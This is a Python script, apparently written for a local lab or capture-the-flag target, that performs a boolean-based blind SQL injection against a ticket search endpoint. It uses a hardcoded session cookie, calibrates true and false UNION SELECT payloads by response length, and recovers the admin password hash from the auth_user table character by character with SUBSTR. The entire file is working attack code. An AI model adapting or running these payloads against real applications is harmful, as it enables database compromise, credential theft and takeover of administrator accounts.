import requests
import string

url = "http://127.0.0.1:5001/tickets/search/"
# PASTE A FRESH SESSIONID HERE (log in again, then grab from Burp):
cookies = {"sessionid": "0xdsmvs9oio085gxengbdsupzflvd1r5"} 

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "$./_=+"
hash_value = ""

print("Calibrating...")

# TRUE condition: all 4 users returned
true_payload = "' UNION SELECT NULL,username,password,NULL FROM auth_user WHERE 'p'='p'-- "
r_true = requests.get(url, params={"q": true_payload}, cookies=cookies)
len_true = len(r_true.content)

# FALSE condition: no extra users returned
false_payload = "' UNION SELECT NULL,username,password,NULL FROM auth_user WHERE 'p'='q'-- "
r_false = requests.get(url, params={"q": false_payload}, cookies=cookies)
len_false = len(r_false.content)

THRESHOLD = (len_true + len_false) / 2

print(f"True length:  {len_true}")
print(f"False length: {len_false}")
print(f"Threshold:    {THRESHOLD}\n")

for pos in range(1, 100):
    found = False
    for c in chars:
        payload = (
            f"' UNION SELECT NULL,username,password,NULL FROM auth_user "
            f"WHERE SUBSTR((SELECT password FROM auth_user WHERE username='admin'),{pos},1)='{c}'-- "
        )
        r = requests.get(url, params={"q": payload}, cookies=cookies)
        if r.status_code == 200 and len(r.content) > THRESHOLD:
            hash_value += c
            print(f"[+] Position {pos}: '{c}'  ->  {hash_value}")
            found = True
            break
    if not found:
        print(f"[-] No match at position {pos}. Stopping.")
        break

print(f"\n[!] Recovered Admin Hash:\n{hash_value}")